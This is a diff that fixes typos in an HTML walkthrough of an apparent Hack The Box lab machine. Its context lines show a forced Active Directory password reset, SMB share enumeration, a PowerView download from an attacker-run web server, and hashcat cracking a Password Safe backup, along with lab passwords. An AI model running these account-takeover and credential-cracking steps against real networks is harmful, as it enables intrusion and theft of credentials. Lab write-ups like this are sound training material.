@@ -63,7 +63,7 @@
             <!-- Step 5 -->
             <section class="step">
                 <h2>Step 5: Force Change Password</h2>
-                <p>Forece Change Password of a Benjamin Account Using Linux Command.</p>
+                <p>Force Change Password of a Benjamin Account Using Linux Command.</p>
                 <p class="command-line">Command: <code>net rpc password "benjamin" "Batman@123" -U "administrator.htb"/"michael"%"Password123" -S "administrator.htb"</code></p>
                 <p><strong>Username: </strong>Benjamin</p>
                 <p><strong>Password: </strong>Batman@123</p>  
@@ -75,21 +75,21 @@
                 <p>Verify User Using SMB Client Authentication</p>
                 <p class="command-line">Command: <code>smbclient -L administrator.htb -U Benjamin</code></p>
                 <p class="command-line">Command: <code>smbclient //administrator.htb/IPC$ -U benjamin</code></p>
-                <p>List all the Availabel Shares for the Perticular User.</p>
+                <p>List all the Available Shares for the Perticular User.</p>
                 <p class="command-line">Command: <code>smbmap -H 10.10.11.42 -u 'benjamin' -p 'Batman@123'</code></p>
             </section>
 
             <!-- Step 7 -->
             <section class="step">
                 <h2>Step 7: SMBMap.</h2>
-                <p>List all the Availabel Shares for the Perticular User.</p>
+                <p>List all the Available Shares for the Perticular User.</p>
                 <p class="command-line">Command: <code>smbmap -H 10.10.11.42 -u 'benjamin' -p 'Batman@123'</code></p>
             </section>
 
             <!-- Step 8 -->
             <section class="step">
                 <h2>Step 8: Optional Steps</h2>
-                <p>Move file to remote machine, first run python web server and use Invock command to download file from python server.</p>
+                <p>Move file to remote machine, first run python web server and use Invoke command to download file from python server.</p>
                 <p class="command-line">Command: <code>python3 -m http.server 8000</code></p>
                 <p>Run the following  on Powershell to download the file.</p>
                 <p class="command-line">Command: <code>Invoke-WebRequest -Uri http://10.10.14.73:8000/powerview.ps1 -OutFile C:\Users\michael\Downloads\powerview.ps1</code></p>
@@ -145,7 +145,7 @@
             <!-- Step 13 -->
             <section class="step">
                 <h2>Step 13: Decrypt Backup.psafe3 with Hashcat to get master password.. </h2>
-                <p>Decrypt the hash that we have downloaded forn the FTP server using Hashcat.</p>
+                <p>Decrypt the hash that we have downloaded from the FTP server using Hashcat.</p>
                 <p class="command-line">Command: <code>hashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlists/rockyou.txt</code></p>
                 <p><strong>Master Password: </strong>tekieromucho</p> 
                 <p>Download Psafer file view and user the master password to view the Psafe file there you have find some users credentials.</p>
